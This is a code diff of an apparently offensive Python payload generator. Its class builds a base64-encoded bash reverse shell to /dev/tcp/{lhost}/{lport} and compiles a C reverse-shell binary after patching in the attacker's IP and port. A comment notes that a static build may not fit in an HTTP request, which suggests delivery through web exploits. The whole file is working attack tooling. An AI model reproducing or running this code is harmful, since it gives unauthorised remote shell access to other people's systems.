@@ -8,10 +8,17 @@ import subprocess
 
 class Generator:
     def __init__(self, lhost, lport):
-        pass
+        self.lhost = lhost
+        self.lport = lport
+
+    def ishell(self):
+        return Generator.shell(self.lhost, self.lport)
+
+    def ibin(self):
+        return Generator.bin(self.lhost, self.lport)
 
     @staticmethod
-    def shell(lhost, lport, s='bash'):
+    def shell(lhost, lport=80, s='bash'):
         sh = f'{s} -i >& /dev/tcp/{lhost}/{lport} 0>&1'
 
         sh_enc = base64.b64encode(sh.encode('utf-8')).decode('utf-8')
@@ -21,73 +28,43 @@ class Generator:
         return wrapped
 
     @staticmethod
-    def bin(lhost, lport, lang='c'):
-        name = 'cshell' if lang == 'c' else 'goshell'
+    def bin(lhost, lport, static=False):
+        name = 'cshell'
 
         compiled_path = f'tmp/{name}'
 
-        if lang == 'c':
-            def set_host_port(file_path, new_host, new_port):
-                with open(file_path, 'r') as file:
-                    lines = file.readlines()
+        def set_host_port(file_path, new_host, new_port):
+            with open(file_path, 'r') as file:
+                lines = file.readlines()
 
-                new_lines = []
-                for line in lines:
-                    if line.strip().startswith('const char* IP ='):
-                        new_lines.append(f'const char* IP = "{new_host}";\n')
-                    elif line.strip().startswith('const int PORT ='):
-                        new_lines.append(f'const int PORT = {new_port};\n')
-                    else:
-                        new_lines.append(line)
+            new_lines = []
+            for line in lines:
+                if line.strip().startswith('const char* IP ='):
+                    new_lines.append(f'const char* IP = "{new_host}";\n')
+                elif line.strip().startswith('const int PORT ='):
+                    new_lines.append(f'const int PORT = {new_port};\n')
+                else:
+                    new_lines.append(line)
 
-                with open(file_path, 'w') as file:
-                    file.writelines(new_lines)
-                
-            src_path = 'payloads/reverse_shell.c'
+            with open(file_path, 'w') as file:
+                file.writelines(new_lines)
+            
+        src_path = 'payloads/reverse_shell.c'
 
-            set_host_port(src_path, lhost, lport)
+        set_host_port(src_path, lhost, lport)
 
-            compiler_args = [
-                'gcc', # can use tcc as well
-                src_path,
-                '-o',
-                compiled_path,
-                '-Os',
-                '-flto',
-                # '-static',
-                # f"-DIP=\"{lhost}\"",
-                # f"-DPORT=\"{lport}\""
-            ]
+        compiler_args = [
+            'gcc', # can use tcc as well
+            src_path,
+            '-o',
+            compiled_path,
+            '-Os',
+            '-flto',
+        ]
 
-        elif lang == 'go':
-            def set_host_port(file_path, new_host, new_port):
-                with open(file_path, 'r') as file:
-                    content = file.read()
+        if static: # might not always fit in an http request
+            compiler_args.append('-static')
 
-                host_pattern = r'(var HOST = )"[^"]*"'
-                new_host_line = r'\g<1>"' + new_host + '"'
-                content = re.sub(host_pattern, new_host_line, content)
-
-                port_pattern = r'(var PORT = )"[^"]*"'
-                new_port_line = r'\g<1>"' + str(new_port) + '"'
-                content = re.sub(port_pattern, new_port_line, content)
-
-                with open(file_path, 'w') as file:
-                    file.write(content)
-
-            src_path = 'payloads/reverse_shell.go'
-
-            set_host_port(src_path, lhost, lport)
-
-            compiler_args = [
-                'go',
-                'build',
-                '-ldflags',
-                '-s -w',
-                '-o',
-                compiled_path,
-                src_path,
-            ]
 
         subprocess.run(['rm', '-f', compiled_path])
         subprocess.run(compiler_args)
